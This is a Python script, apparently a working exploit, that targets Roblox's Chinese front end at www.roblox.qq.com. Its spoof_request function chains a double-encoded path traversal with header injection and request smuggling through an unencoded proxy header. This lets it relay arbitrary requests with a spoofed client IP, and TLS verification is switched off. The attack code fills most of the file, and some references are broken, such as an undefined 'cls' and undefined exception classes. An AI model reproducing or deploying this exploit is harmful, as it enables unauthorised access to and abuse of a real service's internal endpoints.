# h0nda
# 2021-04-11

from http.client import HTTPResponse
from urllib.parse import urlsplit, unquote, quote
from structures import CaseInsensitiveDict
from models import Response
import socket
import ssl
import requests
import json
import brotli
import gzip
import zlib

REAL_IP = requests.get("https://api.ipify.org?format=json").json()["ip"]
CONTEXT = ssl.create_default_context()
CONTEXT.check_hostname = False
CONTEXT.verify_mode = ssl.CERT_NONE

def _get_response(conn, max_chunk_size, decode_content, get_content):
    resp = conn.recv(max_chunk_size)

    if not resp:
        raise EmptyResponse("Empty response from server")

    while not b"\r\n\r\n" in resp:
        resp += conn.recv(max_chunk_size)

    resp, data = resp.split(b"\r\n\r\n", 1)
    resp = resp.decode()
    status, raw_headers = resp.split("\r\n", 1)
    version, status, message = status.split(" ", 2)

    headers = CaseInsensitiveDict()
    for header in raw_headers.splitlines():
        header, value = header.split(":", 1)
        value = value.lstrip(" ")
        if header in headers:
            if isinstance(headers[header], str):
                headers[header] = [headers[header]]
            headers[header].append(value)
        else:
            headers[header] = value
    
    # download chunks until content-length is met
    if get_content:
        if "content-length" in headers:
            goal = int(headers["content-length"])
            while goal > len(data):
                chunk = conn.recv(min(goal-len(data), max_chunk_size))
                if not chunk:
                    raise RequestException("Empty chunk")
                data += chunk
        
        # download chunks until "0\r\n\r\n" is recv'd, then process them
        elif headers.get("transfer-encoding") == "chunked":
            if not data.endswith(b"0\r\n\r\n"):
                while True:
                    chunk = conn.recv(max_chunk_size)
                    data += chunk
                    if not chunk or chunk.endswith(b"0\r\n\r\n"):
                        break

            raw = data
            data = b""
            while raw:
                length, raw = raw.split(b"\r\n", 1)
                length = int(length, 16)
                chunk, raw = raw[:length], raw[length+2:]
                data += chunk

        # download chunks until recv is empty
        else:
            while True:
                chunk = conn.recv(max_chunk_size)
                if not chunk:
                    break
                data += chunk

    if "content-encoding" in headers and decode_content:
        data = cls._decode_content(data, headers["content-encoding"])

    return Response(int(status), message, headers, data)

def _decode_content(content, encoding):
    if encoding == "br":
        content = brotli.decompress(content)
    elif encoding == "gzip":
        content = gzip.decompress(content)
    elif encoding == "deflate":
        content = zlib.decompress(content)
    else:
        raise UnsupportedEncoding(
            f"Unknown encoding type '{encoding}' while decoding content")
    
    return content

def create_socket():
    conn = None
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.settimeout(15)
        conn.connect(("www.roblox.qq.com", 443))
        conn = CONTEXT.wrap_socket(conn)
        return conn
    except:
        try:
            conn.shutdown(socket.SHUT_RDWR)
        except:
            pass
        conn.close()
        raise

def spoof_request(conn, method, url, headers=None, data=None, ip=None):
    purl = urlsplit(url)
    path = purl.path + ("?" + purl.query if purl.query else "")
    path = "/account/signupredir/..%252f..%252f" + path.replace("/", "%2f")

    # payload that'll "override" the request
    payload = ""
    payload += " HTTP/1.1\n"
    payload += "Host: %s\n" % purl.hostname
    payload += "Content-Length: *\n"
    payload += "Roblox-CNP-True-IP: %s\n" % ip
    if headers:
        for key, value in headers.items():
            payload += "%s: %s\n" % (key, value)
    payload += "\n"
    if data:
        payload += data

    # calculate the content-length overhead
    # (the actual content of this doesn't matter, only the length)
    overhead = ""
    overhead += " HTTP/1.1\r\n"
    overhead += "Connection: keep-alive\r\n"
    overhead += "Host: %s\r\n" % "www.roblox.qq.com"
    overhead += "Roblox-Domain: cn\r\n"
    overhead += "Roblox-CNP-Date: 2021-03-06T20:41:52 08:00\r\n"
    overhead += "Roblox-CNP-Secure: cnGgYV/BzUMyhjw3iIiKi0TD6Q0=\r\n"
    overhead += "Roblox-CNP-True-IP: %s\r\n" % REAL_IP
    # funnily enough, this header is also left unencoded
    overhead += "Roblox-CNP-Url: http://%s%s%s\r\n" % (
        "www.roblox.qq.com",
        unquote(path),
        payload)
    overhead += "Content-Length: 0\r\n"
    overhead += "X-Stgw-Time: 1615034512.456\r\n"
    overhead += "X-Client-Proto: https\r\n"
    overhead += "X-Forwarded-Proto: https\r\n"
    overhead += "X-Client-Proto-Ver: HTTP/1.1\r\n"
    overhead += "X-Real-IP: %s\r\n" % REAL_IP
    overhead += "X-Forwarded-For: %s\r\n\r\n" % REAL_IP
    overhead = overhead.replace("*", str(len(overhead)))
    payload = payload.replace("*", str(len(overhead) ))

    # the "real" request that is sent
    request = ""
    request += "%s %s%s HTTP/1.1\r\n" % (method, path, quote(payload))
    request += "Host: %s\r\n" % "www.roblox.qq.com"
    request += "Content-Length: 0\r\n"
    request += "\r\n"
    
    conn.send(request.encode("UTF-8"))
    
    return _get_response(conn, 1024**2, True, True)

